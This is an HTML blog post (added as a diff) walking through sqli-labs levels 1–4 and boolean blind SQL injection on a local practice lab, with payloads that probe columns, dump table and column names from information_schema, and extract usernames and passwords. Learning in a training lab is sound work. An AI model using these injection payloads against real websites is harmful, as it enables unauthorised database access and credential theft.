@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+
+  
+    
+    
+      <link href="/css/fonts.css" rel="stylesheet" type="text/css">
+    
+  
+
+  
+  <title>sqli-labs通关</title>
+
+  
+  
+  <link rel="stylesheet" href="/css/hugo-octopress.css">
+
+  
+  
+
+  
+    <link rel="stylesheet" href="/css/fork-awesome.min.css">
+  
+
+  
+  
+    <link href="https://Frederick2313072.github.io/favicon.png" rel="icon">
+  
+
+  
+  
+
+  <meta name="description" content="因为不想复习数据库所以在玩sqli" />
+  <meta name="keywords" content="">
+  <meta name="author" content="Frederick">
+
+  
+  <meta name="generator" content="Hugo 0.147.0">
+
+  
+  
+
+  
+  
+
+
+
+</head>
+<body>
+
+
+<header role="banner">
+<hgroup>
+  
+  <h1><a href="https://Frederick2313072.github.io/">Frederick</a></h1>
+    <h2>Welcome to my Alter Ego&#39;s site!</h2>
+</hgroup></header>
+
+
+<nav role="navigation">
+<fieldset class="mobile-nav">
+  
+  <select onchange="location = this.value;">
+    <option value="">Navigate…</option>
+      
+        <option value="https://Frederick2313072.github.io/page/search/">» Search</option>
+      
+        <option value="https://Frederick2313072.github.io/about/">» About</option>
+      
+        <option value="https://Frederick2313072.github.io/links/">» Links</option>
+      
+        <option value="https://Frederick2313072.github.io/archives/">» Archives</option>
+      
+  </select>
+</fieldset>
+
+
+<ul class="main-navigation">
+  
+  
+    
+      <li><a href="https://Frederick2313072.github.io/page/search/" title="Search"  target="_blank"  rel="noopener noreferrer">Search</a></li>
+    
+  
+    
+      <li><a href="https://Frederick2313072.github.io/about/" title="About"  target="_blank"  rel="noopener noreferrer">About</a></li>
+    
+  
+    
+      <li><a href="https://Frederick2313072.github.io/links/" title="Links"  target="_blank"  rel="noopener noreferrer">Links</a></li>
+    
+  
+    
+      <li><a href="https://Frederick2313072.github.io/archives/" title="Archives"  target="_blank"  rel="noopener noreferrer">Archives</a></li>
+    
+  
+</ul>
+
+<ul class="subscription">
+  
+    
+        <a href="https://Frederick2313072.github.io/index.xml" target="_blank" type="application/rss+xml" title="RSS" rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a>
+    
+  
+</ul>
+
+
+</nav>
+
+
+<div id="main">
+  <div id="content">
+    <div>
+      <article class="hentry" role="article">
+
+        
+        
+
+<header>
+  <p class="meta">Jan 5, 2025
+     - 3 minute read 
+     - <a href="https://Frederick2313072.github.io/blog/2025-01-05-sqli-labs%E9%80%9A%E5%85%B3/#disqus_thread">Comments</a>
+
+    
+  </p>
+  <h1 class="entry-title">
+     sqli-labs通关 
+  </h1>
+</header>
+
+
+        <div class="entry-content">
+          
+          
+          
+          <ul>
+<li>工具：phpstudy，Hackbar</li>
+<li>搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马)</li>
+<li>数据库：mysql5.7</li>
+</ul>
+<h1 id="联合注入">联合注入</h1>
+<p>需要页面有回显位</p>
+<p>查找注入点</p>
+<p>判断使字符型还是数字型注入id=2-1</p>
+<p>如果是字符型，找到闭合方式，‘，“，’)</p>
+<p>判断查询列数，order by</p>
+<p>查询回显位置，同时将原先的查询id注释掉</p>
+<p>拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来</p>
+<h2 id="less-1">less-1</h2>
+<p>判断是否存在sql注入</p>
+<p>&ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管</p>
+<pre tabindex="0"><code class="language-sqlite" data-lang="sqlite">?id=1&#39; order by 3--+
+</code></pre><p>显示正常</p>
+<pre tabindex="0"><code>?id=1&#39; order by 4--+
+</code></pre><p>报错</p>
+<p>得知less-1共有三列，爆出显示位</p>
+<pre tabindex="0"><code>?id=1&#39; union select 1,2,3--+
+</code></pre><p>在mysql里面尝试union select</p>
+<p><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-05%20125056-1.png" alt="显示正常但没有回显"></p>
+<pre tabindex="0"><code>?id=-1&#39; union select 1,2,3--+
+</code></pre><p>使id=-1报错注释，页面显示正常</p>
+<p><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-05%20130040-1.png" alt=""></p>
+<p>获取数据名</p>
+<pre tabindex="0"><code>?id=-1&#39; union select 1,database(),version() --+
+</code></pre><p><img src="image-20250105192920804.png" alt=""></p>
+<p>中间省略了一些过程详见less-2</p>
+<p>查询用户名和密码</p>
+<pre tabindex="0"><code>?id=-1&#39; union select 1,group_concat(username,&#39;~&#39;,password),3 from users--+
+</code></pre><p><img src="image-20250105180654057.png" alt=""></p>
+<h2 id="less-2">less-2</h2>
+<p>判断为数字型，页面改变</p>
+<pre tabindex="0"><code>?id=2-1 ？id=2
+</code></pre><p>三列</p>
+<pre tabindex="0"><code>?id=1 order by 3
+</code></pre><p>闭合方式为‘</p>
+<pre tabindex="0"><code>?id=1&#39; order by 3
+</code></pre><p>爆数据名</p>
+<pre tabindex="0"><code>？id=-1 union select 1,database(),version()
+</code></pre><p>爆表名</p>
+<pre tabindex="0"><code>?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=&#39;security&#39;
+</code></pre><p>爆列名</p>
+<pre tabindex="0"><code>?id=-1 union select 1,2,group_concat(column_name)  from information_schema.columns where table_schema=&#39;security&#39;
+</code></pre><h2 id="less-3">less-3</h2>
+<p>与前两关不同的地方是闭合方式</p>
+<pre tabindex="0"><code>?id=1&#39;
+</code></pre><p><img src="image-20250105200115666.png" alt=""></p>
+<p>单引号加括号，后续一律以?id=1&rsquo;)开头，和上面同</p>
+<h2 id="less-4">less-4</h2>
+<p>判断得知闭合方式双引号加括号</p>
+<pre tabindex="0"><code>/?id=2&#34;
+</code></pre><p><img src="image-20250105201123859.png" alt=""></p>
+<h1 id="布尔盲注">布尔盲注</h1>
+<p>页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小</p>
+<p>判断得知闭合方式为'</p>
+<ul>
+<li>二分法判断数据库长度</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and length(database())&gt;10--+ //不显示
+?id=1&#39; and length(database())&gt;5--+ //正常显示
+?id=1&#39; and length(database())&gt;7--+ //正常显示
+?id=1&#39; and length(database())&gt;8--+ //不显示
+</code></pre><p>得知database（）长度为8</p>
+<ul>
+<li>二分法利用ASCII码判断字符</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;100--+ //正常显示
+?id=1&#39; and ascii(substr(database(),1,1))&gt;114--+  //正常显示
+?id=1&#39; and ascii(substr(database(),1,1))&gt;120--+  //不显示
+?id=1&#39; and ascii(substr(database(),1,1))&gt;115--+  //不显示
+</code></pre><p>得知第一个字符ASCII码为115，即“s”</p>
+<p>依次判断8个字符，知当前数据库为security</p>
+<ul>
+<li>判断当前数据库的表</li>
+</ul>
+<p>判断是否存在admin表</p>
+<pre tabindex="0"><code>?id=1&#39; and exists(select * from admin)--+
+</code></pre><p><img src="image-20250105210749763.png" alt=""></p>
+<ul>
+<li>判断表的个数</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and (select count(table_name)  from information_schema.tables where table_schema=&#39;security&#39;)&gt;4--+ //正常显示
+?id=1&#39; and (select count(table_name)  from information_schema.tables where table_schema=&#39;security&#39;)&gt;3--+ //不显示
+</code></pre><ul>
+<li>逐一判断表名字符长度</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+
+</code></pre><ul>
+<li>逐一判断表名字符的ASCII码</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100--+
+</code></pre><p>存在emails,referers,uagents,users</p>
+<ul>
+<li>对column执行相同的操作，where语句修改</li>
+</ul>
+<pre tabindex="0"><code>where table_name = &#39;users&#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长
+</code></pre><p>得知users中有三个字段id,username,password</p>
+<ul>
+<li>判断字段长度</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and length((select id from users limit 3,1))=1--+
+</code></pre><ul>
+<li>判断字段ASCII值</li>
+</ul>
+<pre tabindex="0"><code>?id=1&#39; and ascii(substr((select id from users limit 3,1)),1,1)&gt;100--+
+</code></pre>
+        </div>
+        
+
+<footer>
+  <p class="meta">
+    <span class="byline author vcard">Posted by <span class="fn">Frederick</span></span>
+    
+    <time>Jan 5, 2025</time>
+    
+    </span>
+  </p>
+
+  
+
+  <p class="meta">
+    
+        <a class="basic-alignment left" href="https://Frederick2313072.github.io/blog/2024-12-27-%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/" title="概率论模型及小结">概率论模型及小结</a>
+    
+
+    
+      <a class="basic-alignment right" href="https://Frederick2313072.github.io/blog/2025-01-12-nmap%E5%9F%BA%E7%A1%80/" title="nmap基础">nmap基础</a>
+    
+  </p>
+  
+    
+      <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    
+  
+</footer>
+
+
+      </article>
+    </div>
+    
+
+<aside class="sidebar thirds">
+  <section class="first odd">
+
+    
+      <h1>About me</h1>
+    
+
+    <p>
+      
+        <p>2023南开DS在读</p>
+<p>目前在TJUNLP</p>
+<p>感兴趣的方向：NLP,OS,LLM,Security</p>
+<p>最喜欢的编程语言：Rust<br>
+Click on 
+<a href="/about/">About</a> to know more.</p>
+
+      
+    </p>
+  </section>
+
+  
+  
+
+
+
+<ul class="sidebar-nav">
+  <li class="sidebar-nav-item">
+    <a target="_blank" rel="noopener noreferrer" href="https://github.com/Frederick2313072" title="https://github.com/Frederick2313072"><i class="fa fa-github fa-3x"></i></a>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+  
+  
+  </li>
+</ul>
+
+  
+
+  
+    
+      <section class="odd">
+        
+          <h1>Collections</h1>
+        
+        
+          <li>
+            <a href="https://Frederick2313072.github.io/categories/golang/" title="Hugo category" >Hugo category</a>
+          </li>
+        
+      </section>
+    
+  
+
+  
+  
+  
+    
+      <section class="even">
+        <h1>Recent Posts</h1>
+        <ul id="recent_posts">
+          
+          
+            
+          
+            
+              <li class="post">
+                <a href="/blog/2025-04-23-%E5%90%B4%E6%81%A9%E8%BE%BE%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">吴恩达机器学习</a>
+              </li>
+            
+          
+            
+              <li class="post">
+                <a href="/blog/2025-04-12-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%A6%82%E5%BF%B5/">数据结构与算法概念</a>
+              </li>
+            
+          
+            
+              <li class="post">
+                <a href="/blog/2025-04-08-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/">计算机系统层次结构</a>
+              </li>
+            
+          
+            
+              <li class="post">
+                <a href="/blog/2025-04-05-os/">OS</a>
+              </li>
+            
+          
+        </ul>
+      </section>
+    
+  
+</aside>
+
+  </div>
+</div>
+
+    <footer role="contentinfo">
+      <p>Copyright &copy; 2025 Frederick - <a href="https://Frederick2313072.github.io/license/">License</a> -
+        <span class="credit">Powered by <a target="_blank" href="https://gohugo.io" rel="noopener noreferrer">Hugo</a> and <a target="_blank" href="https://github.com/parsiya/hugo-octopress/" rel="noopener noreferrer">Hugo-Octopress</a> theme.
+      </p>
+    </footer>
+
+    
+    
+
+
+
+    
+    
+    
+
+    
+  </body>
+</html>
+
